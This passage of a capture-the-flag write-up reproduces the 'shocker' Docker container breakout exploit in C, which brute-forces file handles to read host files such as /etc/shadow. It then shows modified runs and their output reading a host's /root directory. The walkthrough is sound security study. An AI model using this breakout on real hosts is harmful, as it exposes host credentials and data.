</span><span class='line'>      <span class="n">oh</span><span class="o">-&gt;</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="o">++</span><span class="n">path</span><span class="p">;</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] Resolving &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open_by_handle_at</span><span class="p">(</span><span class="n">bfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file_handle</span> <span class="o">*</span><span class="p">)</span><span class="n">ih</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] open_by_handle_at&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">dir</span> <span class="o">=</span> <span class="n">fdopendir</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] fdopendir&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">de</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">de</span><span class="p">)</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] Found %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Match: %s ino=%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_ino</span><span class="p">);</span>
</span><span class='line'>          <span class="n">ino</span> <span class="o">=</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_ino</span><span class="p">;</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] Brute forcing remaining 32bit. This can take a while...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">de</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xffffffff</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">outh</span><span class="p">.</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
</span><span class='line'>          <span class="n">outh</span><span class="p">.</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>          <span class="n">memcpy</span><span class="p">(</span><span class="n">outh</span><span class="p">.</span><span class="n">f_handle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">));</span>
</span><span class='line'>          <span class="n">memcpy</span><span class="p">(</span><span class="n">outh</span><span class="p">.</span><span class="n">f_handle</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">20</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>              <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] (%s) Trying: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="n">open_by_handle_at</span><span class="p">(</span><span class="n">bfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file_handle</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">outh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span><span class='line'>              <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>              <span class="n">dump_handle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">outh</span><span class="p">);</span>
</span><span class='line'>              <span class="k">return</span> <span class="n">find_handle</span><span class="p">(</span><span class="n">bfd</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outh</span><span class="p">,</span> <span class="n">oh</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span><span class='line'>  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="n">h</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="n">root_h</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
</span><span class='line'>      <span class="p">.</span><span class="n">f_handle</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x02</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">}</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[***] docker VMM-container breakout Po(C) 2014             [***]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>         <span class="s">&quot;[***] The tea from the 90&#39;s kicks your sekurity again.     [***]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>         <span class="s">&quot;[***] If you have pending sec consulting, I&#39;ll happily     [***]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>         <span class="s">&quot;[***] forward to my friends who drink secury-tea too!      [***]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// get a FS reference from something mounted in from outside</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/.dockerinit&quot;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] open&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] Cannot find valid handle!&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Got a final handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">dump_handle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">h</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd2</span> <span class="o">=</span> <span class="n">open_by_handle_at</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file_handle</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">h</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] open_by_handle&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] read&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Win! /etc/shadow output follows:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like it&rsquo;s a simple case of replacing the following line with the file to read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I thought I could be sneaky here and request /root/flag.txt, so I edited the source code, and compiled it as per the instructions</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.4 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; b1c818249f2f
</span><span class='line'>Removing intermediate container 80d78a2e42ff
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in b670431898c9
</span><span class='line'> ---&gt; a8aea5e1a755
</span><span class='line'>Removing intermediate container b670431898c9
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in a19ed14d76b6
</span><span class='line'> ---&gt; 391372de38ec
</span><span class='line'>Removing intermediate container a19ed14d76b6
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in 1572b7cb39e5
</span><span class='line'> ---&gt; 6a588733f8ce
</span><span class='line'>Removing intermediate container 1572b7cb39e5
</span><span class='line'>Successfully built 6a588733f8ce
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;flag.txt&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found flag.txt
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: flag.txt <span class="nv">ino</span><span class="o">=</span>165017
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>flag.txt<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Got a final handle!
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x99, 0x84, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Win! /root/flag.txt output follows:
</span><span class='line'>Errr, you are close, but this is not the flag you are looking <span class="k">for</span>.
</span><span class='line'>
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Wow, 1 it worked, and 2 this is not the flag you are looking for</p>

<p><img src="http://motorcycleradio.us/wp-content/uploads/2014/07/mindtrick.gif" alt="" /></p>

<p>I did notice, however, that it provides a directory listing when trying to find the file requested. There&rsquo;s a folder or file called 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc. I wonder if that is either the flag, or if the flag is in it ?</p>

<p>Firstly lets try requesting it as a file by changing the source code, compile and run it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker build -t shocker/shocker shocker/
</span><span class='line'>Uploading context 101.9 kB
</span><span class='line'>Uploading context
</span><span class='line'>Step <span class="m">0</span> : FROM ubuntu
</span><span class='line'> ---&gt; ba5877dc9bec
</span><span class='line'>Step <span class="m">1</span> : RUN apt-get update <span class="o">&amp;&amp;</span> apt-get install -yq build-essential
</span><span class='line'> ---&gt; Using cache
</span><span class='line'> ---&gt; fe0bdac7e278
</span><span class='line'>Step <span class="m">2</span> : ADD . /app
</span><span class='line'> ---&gt; 4ccef4da8ae5
</span><span class='line'>Removing intermediate container 8cb273148a08
</span><span class='line'>Step <span class="m">3</span> : WORKDIR /app
</span><span class='line'> ---&gt; Running in 661ce7955eae
</span><span class='line'> ---&gt; 66c9d4b419e6
</span><span class='line'>Removing intermediate container 661ce7955eae
</span><span class='line'>Step <span class="m">4</span> : RUN cc -Wall -std<span class="o">=</span>c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</span><span class='line'> ---&gt; Running in 969fcb8e2910
</span><span class='line'> ---&gt; edd283652f36
</span><span class='line'>Removing intermediate container 969fcb8e2910
</span><span class='line'>Step <span class="m">5</span> : CMD <span class="o">[</span><span class="s2">&quot;./shocker&quot;</span><span class="o">]</span>
</span><span class='line'> ---&gt; Running in bbadcbb89ef2
</span><span class='line'> ---&gt; 41afb4ce762a
</span><span class='line'>Removing intermediate container bbadcbb89ef2
</span><span class='line'>Successfully built 41afb4ce762a
</span><span class='line'>robin@flick:~<span class="nv">$ </span>docker run shocker/shocker
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> docker VMM-container breakout Po<span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span>             <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> The tea from the 90<span class="s1">&#39;s kicks your sekurity again.     [***]</span>
</span><span class='line'><span class="s1">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>***<span class="o">]</span> forward to my friends who drink secury-tea too!      <span class="o">[</span>***<span class="o">]</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found mnt
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found home
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found root
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: root <span class="nv">ino</span><span class="o">=</span>130833
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>root<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x11, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving <span class="s1">&#39;53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc&#39;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .bashrc
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found .Xauthority
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Found 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Match: 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc <span class="nv">ino</span><span class="o">=</span>138648
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Brute forcing remaining 32bit. This can take a <span class="k">while</span>...
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc<span class="o">)</span> Trying: 0x00000000
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Got a final handle!
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> <span class="c">#=8, 1, char nh[] = {0x98, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> <span class="nb">read</span>: Is a directory
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a directory, so we need to know the file name. If I request a random filename, I will still get a folder listing, so changing the source code to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/random.txt&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>results in the following when compiled and run</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
